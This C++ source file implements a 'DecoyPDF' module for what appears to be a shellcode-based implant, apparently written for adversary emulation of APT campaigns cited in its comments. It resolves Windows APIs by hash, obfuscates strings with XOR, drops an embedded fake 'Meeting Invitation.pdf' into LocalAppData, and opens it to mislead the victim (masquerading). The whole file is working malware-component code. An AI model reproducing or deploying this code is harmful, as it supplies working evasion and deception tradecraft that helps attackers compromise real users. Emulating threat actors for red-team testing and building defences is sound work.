#include "module_registry.hpp"
#include "DecoyPDF.hpp"
#include "embedded_pdf.hpp"
#include <al/import.hpp>
#include <util.hpp>
#include "fnv1a.hpp"

#define PDF_FILE_PATH "\\Temp\\Meeting Invitation.pdf"

// Populates function pointers for use throughout shellcode
DWORD FetchFunctions(decoy_pdf_pointers* fp) {
    auto kernel32 = GM(L"KERNEL32.DLL", by_ror13);
    if (!kernel32) {
        return FAIL_GET_KERNEL32;
    }

    auto llw = GP(kernel32, LoadLibraryW, by_fnv1a);
    if (!llw) {
        return FAIL_GET_LOADLIBRARYW;
    }

    HMODULE shell32 = llw(L"shell32.dll"_xor);
    if (!shell32) {
        return FAIL_LOAD_LIBRARY_CUSTOM_MODULE_SHELL32;
    }

    HMODULE msvcrt = llw(L"msvcrt.dll"_xor);
    if (!msvcrt) {
        return 1;
    }

    fp->fp_SHGetFolderPathA = GP(shell32, SHGetFolderPathA, by_fnv1a);
    if (!(fp->fp_SHGetFolderPathA)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_SHGETFOLDERPATHA;
    }

    fp->fp_ShellExecuteA = GP(shell32, ShellExecuteA, by_fnv1a);
    if (!(fp->fp_ShellExecuteA)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_SHELLEXECUTEA;
    }

    fp->fp_CreateFileA = GP(kernel32, CreateFileA, by_fnv1a);
    if (!(fp->fp_CreateFileA)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_CREATEFILEA;
    }

    fp->fp_WriteFile = GP(kernel32, WriteFile, by_fnv1a);
    if (!(fp->fp_WriteFile)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_WRITEFILEA;
    }

    fp->fp_CloseHandle = GP(kernel32, CloseHandle, by_fnv1a);
    if (!(fp->fp_CloseHandle)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_CLOSEHANDLE;
    }

    fp->fp_malloc = GP(msvcrt, malloc, by_fnv1a);
    if (!(fp->fp_malloc)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_MALLOC;
    }

    fp->fp_free = GP(msvcrt, free, by_fnv1a);
    if (!(fp->fp_free)) {
        return ERROR_GET_POINTER_CUSTOM_MODULE_FREE;
    }
    return ERROR_SUCCESS;
}

/*
 * HandleDecoyPDF:
 *      About:
 *          Drops a decoy PDF meeting invitation
 *      Result:
 *          PDF opens on success
 *      MITRE ATT&CK Techniques:
 *          T1036: Masquerading
 *          T1573.002: Encrypted Channel: Asymmetric Cryptography
 *      CTI:
 *          https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
 *          https://www.trendmicro.com/en_us/research/24/b/earth-preta-campaign-targets-asia-doplugs.html
 *          https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf
 */
void HandleDecoyPDF(void* data, void* context, logger_ctx* log_ctx) {
    decoy_pdf_pointers* ctx = (decoy_pdf_pointers*)context;
    module_context_t* m_ctx = (module_context_t*)data;

    char tempPath[MAX_PATH];

    HRESULT getPathResult = ctx->fp_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, tempPath);
    if (getPathResult == S_OK) {
        AesLogger::LogDebug(log_ctx, "Resolved local appdata path to: %s."_xor, tempPath);
        size_t length = strlen(tempPath);

        if (length + strlen(PDF_FILE_PATH) + 1 < MAX_PATH) {
            pi_memcpy(tempPath + length, XOR_MACRO(PDF_FILE_PATH), strlen(PDF_FILE_PATH) + 1);

            // Create file handle
            AesLogger::LogDebug(log_ctx, "Creating PDF file at path %s."_xor, tempPath);
            HANDLE hFile = ctx->fp_CreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) {
                AesLogger::LogError(log_ctx, "Failed to open handle to PDF file. Error code: %d."_xor, tempPath, log_ctx->fp->fp_GetLastError());
                m_ctx->output = (char*)"Failed to open handle to PDF file.";
                m_ctx->outputSize = strlen((char*)m_ctx->output);
                return;
            }

            // Write data to file
            AesLogger::LogDebug(log_ctx, "Writing PDF file."_xor);
            DWORD bytesWritten = 0;
            pdf_data_ctx* pdf_ctx = (pdf_data_ctx*)ctx->fp_malloc(sizeof(pdf_data_ctx));
            load_pdf_data(pdf_ctx);
            if (!ctx->fp_WriteFile(hFile, pdf_ctx->pdf_data, (DWORD)pdf_ctx->pdf_data_len, &bytesWritten, NULL)) {
                AesLogger::LogError(log_ctx, "Failed to write PDF file. Error code: %d."_xor, tempPath, log_ctx->fp->fp_GetLastError());
                m_ctx->output = (char*)"Failed to write PDF file.";
                m_ctx->outputSize = strlen((char*)m_ctx->output);
                ctx->fp_CloseHandle(hFile);
                ctx->fp_free(pdf_ctx);
                return;
            }

            // Close handle and return success.
            ctx->fp_CloseHandle(hFile);
            ctx->fp_free(pdf_ctx);
            AesLogger::LogSuccess(log_ctx, "PDF saved successfully."_xor);

            INT_PTR pdf_result = (INT_PTR)ctx->fp_ShellExecuteA(
                NULL,
                "open",
                tempPath,
                NULL,
                NULL,
                SW_NORMAL
            );
            if (pdf_result == ERROR_FILE_NOT_FOUND) {
                AesLogger::LogError(log_ctx, "ERROR_FILE_NOT_FOUND: PDF file not found."_xor);
                m_ctx->output = (char*)"ERROR_FILE_NOT_FOUND: PDF file not found.";
                m_ctx->outputSize = strlen((char*)m_ctx->output);
                return;
            }
            else if (pdf_result == ERROR_PATH_NOT_FOUND) {
                AesLogger::LogError(log_ctx, "ERROR_PATH_NOT_FOUND: PDF file path not found."_xor);
                m_ctx->output = (char*)"PDF file path not found.";
                m_ctx->outputSize = strlen((char*)m_ctx->output);
                return;
            }
            else if (pdf_result == SE_ERR_FNF) {
                AesLogger::LogError(log_ctx, "SE_ERR_FNF: PDF file not found."_xor);
                m_ctx->output = (char*)"SE_ERR_FNF: PDF file not found.";
                m_ctx->outputSize = strlen((char*)m_ctx->output);
                return;
            }
            else if (pdf_result <= 32) {
                AesLogger::LogError(log_ctx, "Failed to open PDF. Result: 0x%x"_xor, pdf_result);
                m_ctx->output = (char*)"Failed to open PDF.";
                m_ctx->outputSize = strlen((char*)m_ctx->output);
                return;
            }

            AesLogger::LogSuccess(log_ctx, "PDF opened successfully."_xor);
            m_ctx->output = (char*)"PDF saved and opened successfully.";
            m_ctx->outputSize = strlen((char*)m_ctx->output);
        } else {
            AesLogger::LogError(log_ctx, "File path too long."_xor);
            m_ctx->output = (char*)"File path too long.";
            m_ctx->outputSize = strlen((char*)m_ctx->output);
        }
    } else {
        AesLogger::LogError(log_ctx, "Failed to get local appdata path. SHGetFolderPathA returned HRESULT: 0x%x"_xor, getPathResult);
        m_ctx->output = (char*)"Failed to resolve CSIDL_LOCAL_APPDATA.";
        m_ctx->outputSize = strlen((char*)m_ctx->output);
    }
    return;
}

DWORD RegisterModule_DecoyPDF(sh_context* ctx, uint32_t module_id) {
    decoy_pdf_pointers* m_ctx = (decoy_pdf_pointers*)ctx->fp.fp_malloc(sizeof(decoy_pdf_pointers));
    if (!m_ctx) {
        AesLogger::LogError(ctx->log_ctx, "Failed to allocate memory for module with ID 0x%x"_xor, module_id);
        return CUSTOM_MODULE_DECOYPDF_FAIL_MALLOC_STRUCT;
    }

    DWORD result = ERROR_SUCCESS;

    result = FetchFunctions(m_ctx);
    if (result != ERROR_SUCCESS) {
        ctx->fp.fp_free(m_ctx);
        AesLogger::LogError(ctx->log_ctx, "Failed to fetch functions for module with ID 0x%x. Error code: %d"_xor, module_id, result);
        return CUSTOM_MODULE_DECOYPDF_FAIL_GET_POINTERS;
    }


    result = RegisterModule(ctx, module_id, HandleDecoyPDF, m_ctx);
    if (result != ERROR_SUCCESS) {
        ctx->fp.fp_free(m_ctx);
        AesLogger::LogError(ctx->log_ctx, "Failed to register module ID 0x%x. Error code: %d"_xor, module_id, result);
        return CUSTOM_MODULE_DECOYPDF_FAIL_REGISTER_MODULE;
    }

    AesLogger::LogSuccess(ctx->log_ctx, "Successfully registered module 0x%x."_xor, module_id);

    return result;
}
